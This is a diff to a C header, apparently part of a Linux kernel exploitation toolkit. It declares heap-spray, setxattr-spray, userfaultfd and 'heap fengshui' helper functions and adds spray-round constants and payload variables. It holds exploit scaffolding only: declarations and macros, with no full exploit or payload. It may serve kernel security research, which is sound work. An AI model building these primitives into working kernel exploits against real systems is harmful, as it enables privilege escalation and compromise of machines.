@@ -1,3 +1,4 @@
+#pragma once
 #include <sys/types.h>
 #include <stdio.h>
 #include <linux/userfaultfd.h>
@@ -15,21 +16,22 @@
 #include <sys/xattr.h>
 #include <poll.h>
 
-static int init_userfaultfd(void *addr);
-static void *init_pages();
-static void *fault_handler_thread(void *arg);
-static void *spray(void* arg);
-static void *spray_setxattr(void *arg);
-static void fork_and_spray(int round, int objs_each_round);
-static void init_heap_spray(int _objectSize, char* _payload, int _payloadSize);
-static void do_heap_fengshui(int loop);
-static void do_free(int num);
+void fork_and_spray(int round, int objs_each_round, int shade, int new_page);
+void init_heap_spray(int _objectSize, char* _payload, int _payloadSize);
+void do_heap_fengshui(int loop);
+void do_free(u_int64_t VAL);
+void change_payload(char* payload, int size);
 
-
-#define do_spray(round) \
-    fork_and_spray(round, 1); \
+#define MAX_ROUND 512
+#define OBJS_EACH_ROUND 64
+#define MIN(X, Y) ((X) >= (Y) ? (Y) : (X))
+#define MAX(X, Y) ((X) >= (Y) ? (X) : (Y))
+#define do_spray(round, shade) \
+    fork_and_spray(round, 1, shade, 1); \
     sleep(1);
 
 static size_t objectSize = 0;
 static size_t payloadSize = 0;
-static char *payload = NULL;
+static char *fengshuiPayload = NULL;
+int default_round;
+pthread_mutex_t *lock[MAX_ROUND];
